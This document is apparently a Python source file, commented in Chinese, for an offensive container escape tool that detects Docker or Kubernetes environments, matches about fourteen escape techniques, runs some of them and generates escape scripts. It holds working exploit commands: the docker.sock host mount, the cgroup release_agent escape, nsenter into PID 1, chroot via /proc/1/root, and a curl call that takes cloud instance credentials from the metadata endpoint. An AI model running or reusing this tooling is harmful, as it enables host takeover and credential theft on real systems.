"""
容器逃逸模块 - Docker/K8s/LXC 全路径逃逸引擎
ContainerEscape: 自动检测环境→匹配逃逸路径→执行逃逸→验证
"""

import os, subprocess, json, tempfile, base64
from datetime import datetime


class ContainerEscape:
    """容器逃逸引擎 - 18种逃逸路径"""

    ESCAPE_TECHNIQUES = {
        # ===== 特权容器逃逸 =====
        "docker_socket": {
            "name": "Docker Socket挂载逃逸",
            "condition": "os.path.exists('/var/run/docker.sock')",
            "exploit": "docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host sh -c 'echo ESCAPED && id'",
            "risk": "极高",
            "impact": "宿主机root"
        },
        "privileged_container": {
            "name": "特权容器逃逸 - cgroup",
            "condition": "check_privileged()",
            "exploit": "mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab) && echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo 'id > /tmp/escaped' >> /cmd && chmod +x /cmd && sh -c 'echo \\$\\$ > /tmp/cgrp/x/cgroup.procs'",
            "risk": "极高",
            "impact": "宿主机代码执行"
        },
        "cap_sys_admin": {
            "name": "CAP_SYS_ADMIN逃逸",
            "condition": "check_cap('cap_sys_admin')",
            "exploit": "mount /dev/sda1 /mnt && chroot /mnt sh -c 'echo ESCAPED'",
            "risk": "极高",
            "impact": "宿主机chroot"
        },
        "cap_sys_module": {
            "name": "内核模块加载逃逸",
            "condition": "check_cap('cap_sys_module')",
            "exploit": "编译内核模块加载到宿主机内核",
            "risk": "极高",
            "impact": "宿主机内核代码执行"
        },
        "cap_sys_ptrace": {
            "name": "进程注入逃逸",
            "condition": "check_cap('cap_sys_ptrace')",
            "exploit": "注入宿主机进程并劫持执行流",
            "risk": "高",
            "impact": "宿主机进程劫持"
        },
        # ===== 错误配置逃逸 =====
        "host_pid_ns": {
            "name": "hostPID逃逸",
            "condition": "check_host_pid()",
            "exploit": "nsenter --target 1 --mount --uts --ipc --net --pid bash -c 'echo ESCAPED'",
            "risk": "高",
            "impact": "宿主机nsenter"
        },
        "host_network": {
            "name": "hostNetwork逃逸",
            "condition": "check_host_network()",
            "exploit": "利用宿主机网络访问内部服务/ARP欺骗",
            "risk": "中",
            "impact": "网络横向移动"
        },
        "host_ipc": {
            "name": "hostIPC逃逸",
            "condition": "check_host_ipc()",
            "exploit": "通过宿主机共享内存通信/注入",
            "risk": "中",
            "impact": "IPC通信"
        },
        "host_root_mount": {
            "name": "宿主机根目录挂载逃逸",
            "condition": "check_mount('/')",
            "exploit": "直接操作挂载的宿主机文件系统",
            "risk": "极高",
            "impact": "宿主机完整控制"
        },
        "procfs_leak": {
            "name": "/proc泄露逃逸",
            "condition": "os.path.exists('/proc/1/root/root')",
            "exploit": "chroot /proc/1/root /bin/sh",
            "risk": "高",
            "impact": "宿主机文件系统访问"
        },
        # ===== 内核漏洞逃逸 =====
        "kernel_exploit": {
            "name": "内核漏洞逃逸 (DirtyPipe/CVE-2022-0847)",
            "condition": "check_kernel_version('5.8', '5.16.11')",
            "exploit": "利用DirtyPipe覆写宿主机文件",
            "risk": "极高",
            "impact": "宿主机文件覆写提权"
        },
        # ===== 服务暴露逃逸 =====
        "kubelet_api": {
            "name": "Kubelet API逃逸",
            "condition": "check_kubelet_access()",
            "exploit": "curl -sk https://node-ip:10250/runningpods/ 获取宿主机Pod信息，进而创建特权Pod",
            "risk": "极高",
            "impact": "集群控制"
        },
        "etcd_access": {
            "name": "Etcd访问逃逸",
            "condition": "check_etcd_access()",
            "exploit": "连接Etcd获取集群所有密钥和Pod定义",
            "risk": "极高",
            "impact": "集群完全控制"
        },
        # ===== 云元数据逃逸 =====
        "cloud_metadata": {
            "name": "云元数据SSRF逃逸",
            "condition": "check_cloud_metadata()",
            "exploit": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
            "risk": "高",
            "impact": "云角色凭据窃取"
        },
    }

    def __init__(self):
        self.findings = {"container_detected": False, "escape_paths": [], "executed": [], "timestamp": str(datetime.now())}

    def detect_environment(self) -> dict:
        """检测当前容器环境"""
        r = {}
        # 检测是否在容器中
        r["is_container"] = any([
            os.path.exists("/.dockerenv"),
            "docker" in open("/proc/1/cgroup", "r").read().lower() if os.path.exists("/proc/1/cgroup") else "",
            os.path.exists("/run/secrets/kubernetes.io"),
            os.path.exists("/var/run/secrets/kubernetes.io"),
        ])
        self.findings["container_detected"] = r["is_container"]
        if not r["is_container"]:
            r["message"] = "未检测到容器环境"
            return r

        # 容器类型
        if os.path.exists("/run/secrets/kubernetes.io") or os.path.exists("/var/run/secrets/kubernetes.io"):
            r["container_type"] = "Kubernetes Pod"
        elif os.path.exists("/.dockerenv"):
            r["container_type"] = "Docker Container"
        else:
            r["container_type"] = "Unknown Container"

        # 检测权限
        r["privileged"] = self._check_privileged()
        r["capabilities"] = self._check_capabilities()
        r["host_pid"] = self._check_host_pid()
        r["host_network"] = self._check_host_network()
        r["host_ipc"] = self._check_host_ipc()
        r["docker_socket"] = os.path.exists("/var/run/docker.sock")
        r["host_mounts"] = self._check_host_mounts()
        r["kernel_version"] = self._get_kernel_version()
        r["cloud_metadata"] = self._check_cloud_metadata()

        # 匹配逃逸路径
        r["matched_techniques"] = []
        for tech_id, tech in self.ESCAPE_TECHNIQUES.items():
            try:
                if eval(tech["condition"]):
                    r["matched_techniques"].append({
                        "id": tech_id,
                        "name": tech["name"],
                        "risk": tech["risk"],
                        "impact": tech["impact"],
                        "exploit_cmd": tech["exploit"][:500]
                    })
            except: pass

        self.findings["environment"] = r
        self.findings["escape_paths"] = r.get("matched_techniques", [])
        return r

    def _check_privileged(self) -> bool:
        """检测特权容器"""
        try:
            # 检查设备访问
            devices = subprocess.run("ls /dev 2>/dev/null | wc -l", shell=True, capture_output=True, text=True, timeout=3)
            if int(devices.stdout.strip() or 0) > 50:
                return True
            # 检查cgroup
            cg = "/proc/1/cgroup"
            if os.path.exists(cg):
                content = open(cg).read()
                if "docker" in content and ":/" == content.strip().split("\n")[0].split(":")[1] if ":" in content else False:
                    return False  # 非特权
                return False
        except: pass
        return False

    def _check_capabilities(self) -> list:
        """检测 capabilities"""
        caps = []
        try:
            out = subprocess.run("capsh --print 2>/dev/null | grep '^Bounding set'", shell=True, capture_output=True, text=True, timeout=3)
            if out.stdout:
                cap_list = out.stdout.split("=")[-1].strip().split(",")
                caps = [c.strip() for c in cap_list]
        except: pass
        return caps

    def _check_host_pid(self) -> bool:
        """检测hostPID"""
        try:
            if not os.path.exists("/proc/1/ns/pid"): return False
            out = subprocess.run("ls -la /proc/1/ns/pid 2>/dev/null", shell=True, capture_output=True, text=True, timeout=3)
            # 比较容器init pid namespace和自身
            out2 = subprocess.run("ls -la /proc/self/ns/pid 2>/dev/null", shell=True, capture_output=True, text=True, timeout=3)
            if out.stdout and out2.stdout:
                return out.stdout.split("->")[-1].strip() == out2.stdout.split("->")[-1].strip()
        except: pass
        return False

    def _check_host_network(self) -> bool:
        """检测hostNetwork"""
        try:
            out = subprocess.run("ip addr 2>/dev/null | grep -c 'eth\\|ens\\|enp'", shell=True, capture_output=True, text=True, timeout=3)
            count = int(out.stdout.strip() or 0)
            return count > 5  # 容器通常只有1-2个接口
        except: return False

    def _check_host_ipc(self) -> bool:
        """检测hostIPC"""
        try:
            out = subprocess.run("ipcs -m 2>/dev/null | wc -l", shell=True, capture_output=True, text=True, timeout=3)
            return int(out.stdout.strip() or 0) > 5
        except: return False

    def _check_host_mounts(self) -> list:
        """检测宿主机挂载"""
        mounts = []
        try:
            with open("/proc/mounts", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        if parts[1] in ["/host", "/root", "/mnt", "/var/run/docker.sock"]:
                            mounts.append(parts[1])
                        if "host" in parts[1].lower() or "root" in parts[1].lower():
                            mounts.append(parts[1])
        except: pass
        return mounts

    def _get_kernel_version(self) -> str:
        try:
            return subprocess.run("uname -r", shell=True, capture_output=True, text=True, timeout=3).stdout.strip()
        except: return "unknown"

    def _check_cloud_metadata(self) -> bool:
        """检测云元数据端点可达"""
        try:
            out = subprocess.run(
                "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5)
            return len(out.stdout) > 10
        except: return False

    def execute_escape(self, technique_id: str) -> dict:
        """执行逃逸技术"""
        r = {"technique_id": technique_id, "success": False, "output": ""}
        tech = self.ESCAPE_TECHNIQUES.get(technique_id)
        if not tech:
            r["output"] = f"技术ID不存在: {technique_id}"
            return r

        try:
            # 安全检查 - 只执行低风险的验证命令
            safe_techniques = ["host_pid_ns", "host_network", "host_ipc", "cloud_metadata", "procfs_leak", "kubelet_api"]
            if technique_id not in safe_techniques:
                r["output"] = f"⚠️ 高危逃逸技术 [{technique_id}] 需手动执行:\n```\n{tech['exploit'][:1000]}\n```"
                r["warning"] = "此技术会直接操作宿主机，自动执行被禁用"
                return r

            cmd = tech["exploit"]
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            r["success"] = "ESCAPED" in out.stdout or "ESCAPED" in out.stderr
            r["output"] = (out.stdout + out.stderr)[:5000]
        except Exception as e:
            r["output"] = f"执行错误: {e}"
        self.findings["executed"].append(r)
        return r

    def auto_escape(self) -> dict:
        """自动逃逸 - 检测所有路径"""
        env = self.detect_environment()
        if not self.findings["escape_paths"]:
            return {"status": "no_path", "message": "未发现可用逃逸路径"}

        results = []
        for path in self.findings["escape_paths"]:
            safe_ids = ["host_pid_ns", "cloud_metadata", "procfs_leak"]
            if path["id"] in safe_ids:
                r = self.execute_escape(path["id"])
                results.append(r)
            else:
                results.append({
                    "technique_id": path["id"],
                    "success": False,
                    "output": f"需手动: {path['exploit_cmd'][:300]}"
                })
        self.findings["auto_results"] = results
        return self.findings

    def generate_escape_script(self, technique_id: str) -> str:
        """生成逃逸脚本"""
        tech = self.ESCAPE_TECHNIQUES.get(technique_id)
        if not tech: return f"# 未知技术: {technique_id}"
        script = f"""#!/bin/bash
# Container Escape: {tech['name']}
# Risk: {tech['risk']} | Impact: {tech['impact']}
# Auto-generated by DeepSeek-Bot ContainerEscape

{tech['exploit']}
"""
        return script


# ===== 分发器 =====
def container_escape(action: str = "detect", technique: str = "", **kwargs) -> str:
    """容器逃逸分发器"""
    ce = ContainerEscape()
    try:
        if action == "detect":
            r = ce.detect_environment()
            paths = r.get("matched_techniques", [])
            table = "| # | 技术 | 风险 | 影响 |\n|---|---|---|---|\n"
            for i, p in enumerate(paths, 1):
                table += f"| {i} | {p['name']} | {p['risk']} | {p['impact']} |\n"
            return f"<b>🐳 容器逃逸路径: {len(paths)}条</b>\n\n{table}"

        if action == "auto":
            r = ce.auto_escape()
            return f"<b>🐳 自动逃逸结果</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        if action == "execute":
            r = ce.execute_escape(technique)
            return f"<b>🐳 逃逸执行: {technique}</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        if action == "script":
            script = ce.generate_escape_script(technique)
            return f"<b>🐳 逃逸脚本: {technique}</b>\n<pre>{script[:8000]}</pre>"

        if action == "list":
            techs = []
            for tid, tech in ce.ESCAPE_TECHNIQUES.items():
                techs.append(f"<b>{tid}</b>: {tech['name']} [{tech['risk']}]")
            return "<b>🐳 所有逃逸技术</b>\n" + "\n".join(techs)

        return f"?container_escape action={action}"
    except Exception as e:
        return f"E:container_escape {e}"
